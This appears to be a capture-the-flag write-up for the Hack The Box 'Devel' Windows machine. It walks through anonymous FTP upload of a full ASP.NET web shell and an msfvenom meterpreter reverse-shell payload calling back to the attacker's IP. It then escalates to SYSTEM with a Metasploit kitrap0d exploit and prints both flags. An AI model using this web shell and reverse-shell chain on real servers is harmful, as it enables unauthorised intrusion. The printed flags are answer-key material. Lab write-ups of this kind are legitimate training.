+++
title = "HTB Writeup - Devel (Easy)"
author = "CyberSpider"
description = "Writeup of Devel from Hack The Box."
tags = ['htb', 'easy', 'windows']
lastmod = 2023-07-18
draft = false
+++

The `Devel` machine is an easy linux box.

![Scenario 1: Across columns](/images/Devel.png#center)

### Nmap Scan

I do a `nmap scan`:

```sh
┌──(kali㉿kali)-[~]
└─$ nmap -A -sC -sV 10.10.10.5  
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-18 14:11 EDT
Stats: 0:00:16 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 14:11 (0:00:06 remaining)
Nmap scan report for 10.10.10.5
Host is up (0.12s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 07-18-23  09:04PM       <DIR>          files
| 03-17-17  05:37PM                  689 iisstart.htm
| 07-18-23  12:56PM                 2774 shell.aspx
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.32 seconds
```

### FTP 

I connect to `ftp` with Anonymous login `Anonymous:Anonymous`, and I download this file `iisstart.htm` :

```sh
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49159|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> get iisstart.htm
local: iisstart.htm remote: iisstart.htm
229 Entering Extended Passive Mode (|||49160|)
150 Opening ASCII mode data connection.
100% |********************************************************************************************************************************************************************************************|   689        5.86 KiB/s    00:00 ETA
226 Transfer complete.
689 bytes received in 00:00 (5.85 KiB/s)
```

I try to load a file:

```sh
ftp> put 
(local-file) file.txt  
(remote-file) file.txt  
local: file.txt remote: file.txt
229 Entering Extended Passive Mode (|||49166|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************************************************************************************************************************|   613 KiB  783.42 KiB/s    --:-- ETA
226 Transfer complete.
628554 bytes sent in 00:01 (599.53 KiB/s)
ftp> 
```

I have see this directory  `aspnet_client` thereby I can load and `execute` a reverse shell with `aspx` extension: 

- Reverse Shell:
```aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```

I load the reverse shell:

```sh
ftp> put cmdasp.aspx
local: cmdasp.aspx remote: cmdasp.aspx
229 Entering Extended Passive Mode (|||49173|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************************************************************************************************************************|  1442        8.87 MiB/s    --:-- ETA
226 Transfer complete.
1442 bytes sent in 00:00 (12.10 KiB/s)
ftp> 
```

## Foothold

### HTTP

I can go in this page http://10.10.10.5/cmdasp.aspx, I digit `whoami`:

- Request:
```http
POST /cmdasp.aspx HTTP/1.1
Host: 10.10.10.5
Content-Length: 177
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.5
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.5/cmdasp.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

__VIEWSTATE=%2FwEPDwULLTE2MjA0MDg4ODhkZLy9q6WrElDiXrcKvS9uoRoeiI2y&__EVENTVALIDATION=%2FwEWAwLd3a6aBAKa%2B%2BKPCgKBwth5U5mFK%2FzdvqmQKHdW9p8AojEQAZo%3D&txtArg=whoami&testing=excute
```

- Response:
```http
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
Date: Tue, 18 Jul 2023 18:59:39 GMT
Connection: close
Content-Length: 992

<pre>iis apppool\web

</pre>
```

I check my privileges:

- Request
```http
POST /cmdasp.aspx HTTP/1.1
Host: 10.10.10.5
Content-Length: 177
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://10.10.10.5
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.10.10.5/cmdasp.aspx
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

__VIEWSTATE=%2FwEPDwULLTE2MjA0MDg4ODhkZLy9q6WrElDiXrcKvS9uoRoeiI2y&__EVENTVALIDATION=%2FwEWAwLd3a6aBAKa%2B%2BKPCgKBwth5U5mFK%2FzdvqmQKHdW9p8AojEQAZo%3D&txtArg=whoami+/priv&testing=excute
```

- Response:
```http
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/html; charset=utf-8
Server: Microsoft-IIS/7.5
X-AspNet-Version: 2.0.50727
X-Powered-By: ASP.NET
Date: Tue, 18 Jul 2023 19:03:08 GMT
Connection: close
Content-Length: 2017

<pre>
PRIVILEGES INFORMATION
----------------------
Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```


## Privilege Escalation

I create a reverse shell with `msfvenom`:

```sh
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.104 LPORT=1234 -f aspx > backdoor.aspx 
```


I load this reverse shell on the web server:

```sh
┌──(kali㉿kali)-[~]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put backdoor.aspx
local: backdoor.aspx remote: backdoor.aspx
229 Entering Extended Passive Mode (|||49344|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************|  2930       14.25 MiB/s    --:-- ETA
226 Transfer complete.
2930 bytes sent in 00:00 (24.90 KiB/s)
ftp> 
```

I set the Listener with `metasploit`:

```sh
msf6> use /multi/handler
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > set LHOST 10.10.14.104
LHOST => 10.10.14.104
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.104:1234 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.104:1234 -> 10.10.10.5:49345) at 2023-07-18 15:30:40 -0400

meterpreter > 

```

I exit to this session and I use `post/multi/recon/local_exploit_suggester` module to have list all vulnerabilities on  this machine:

```sh
meterpreter > background
[*] Backgrounding session 2...
msf6 exploit(multi/handler) > search suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

[*] Using post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > show options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits


View the full module info with the info, or info -d command.

msf6 post(multi/recon/local_exploit_suggester) > sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  2         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.104:1234 -> 10.10.10.5:49349 (10.10.10.5)

msf6 post(multi/recon/local_exploit_suggester) > set session 2
session => 2
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 186 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection_juicy: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.5 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 2   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 3   exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 4   exploit/windows/local/ms13_053_schlamperei                     Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms13_081_track_popup_menu                Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ms15_004_tswbproxy                       Yes                      The service is running, but could not be validated.
 8   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 10  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/ms16_075_reflection_juicy                Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ntusermndragover                         Yes                      The target appears to be vulnerable.
 14  exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 16  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 17  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.
 18  exploit/windows/local/anyconnect_lpe                           No                       The target is not exploitable. vpndownloader.exe not found on file system
 19  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 20  exploit/windows/local/bthpan                                   No                       The target is not exploitable.
 21  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 22  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 23  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 24  exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!
 25  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 26  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 27  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 28  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 29  exploit/windows/local/ipass_launch_app                         No                       The check raised an exception.
 30  exploit/windows/local/lenovo_systemupdate                      No                       The check raised an exception.
 31  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
 32  exploit/windows/local/mqac_write                               No                       The target is not exploitable.
 33  exploit/windows/local/ms14_070_tcpip_ioctl                     No                       The target is not exploitable.
 34  exploit/windows/local/ms_ndproxy                               No                       The target is not exploitable.
 35  exploit/windows/local/novell_client_nicm                       No                       The target is not exploitable.
 36  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 37  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 38  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 39  exploit/windows/local/tokenmagic                               No                       The target is not exploitable.
 40  exploit/windows/local/virtual_box_guest_additions              No                       The target is not exploitable.
 41  exploit/windows/local/webexec                                  No                       The check raised an exception.

[*] Post module execution completed

```

I use this module `exploit/windows/local/ms10_015_kitrap0d`:

```sh
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms10_015_kitrap0d 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms10_015_kitrap0d) > set session 2
session => 2
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.0.2.15:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching msiexec to host the DLL...
[+] Process 3160 launched.
[*] Reflectively injecting the DLL into 3160...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
^C[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lhost 10.10.14.104
lhost => 10.10.14.104
msf6 exploit(windows/local/ms10_015_kitrap0d) > set lport 2345
lport => 2345
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 10.10.14.104:2345 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 2416 launched.
[*] Reflectively injecting the DLL into 2416...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 3 opened (10.10.14.104:2345 -> 10.10.10.5:49351) at 2023-07-18 15:47:30 -0400

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

I take the `user flag`:

```sh
c:\windows\system32\inetsrv>cd ..
cd ..

c:\Windows\System32>cd ..
cd ..

c:\Windows>cd Users
cd Users
The system cannot find the path specified.

c:\Windows>cd ..
cd ..

c:\>cd Users
cd Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users

18/03/2017  02:16 ��    <DIR>          .
18/03/2017  02:16 ��    <DIR>          ..
18/03/2017  02:16 ��    <DIR>          Administrator
17/03/2017  05:17 ��    <DIR>          babis
18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  10:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.691.140.608 bytes free

c:\Users>cd babis
cd babis

c:\Users\babis>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\babis

17/03/2017  05:17 ��    <DIR>          .
17/03/2017  05:17 ��    <DIR>          ..
17/03/2017  05:17 ��    <DIR>          Contacts
11/02/2022  04:54 ��    <DIR>          Desktop
17/03/2017  05:17 ��    <DIR>          Documents
17/03/2017  05:17 ��    <DIR>          Downloads
17/03/2017  05:17 ��    <DIR>          Favorites
17/03/2017  05:17 ��    <DIR>          Links
17/03/2017  05:17 ��    <DIR>          Music
17/03/2017  05:17 ��    <DIR>          Pictures
17/03/2017  05:17 ��    <DIR>          Saved Games
17/03/2017  05:17 ��    <DIR>          Searches
17/03/2017  05:17 ��    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)   4.691.140.608 bytes free

c:\Users\babis>cd Desktop
cd Desktop

c:\Users\babis\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\babis\Desktop

11/02/2022  04:54 ��    <DIR>          .
11/02/2022  04:54 ��    <DIR>          ..
18/07/2023  09:19 ��                34 user.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.691.140.608 bytes free

c:\Users\babis\Desktop>type user.txt
type user.txt
91477ae53cac8728aa60527f6c85a2b8
```

I take the `root flag`:

```sh
c:\Users\babis\Desktop>cd ..
cd ..

c:\Users\babis>cd ..
cd ..

c:\Users>cd Administrator\Desktop
cd Administrator\Desktop

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users\Administrator\Desktop

14/01/2021  12:42 ��    <DIR>          .
14/01/2021  12:42 ��    <DIR>          ..
18/07/2023  09:19 ��                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   4.691.140.608 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
3f1e6df5c0cd3497fbdeaa80572860e1
```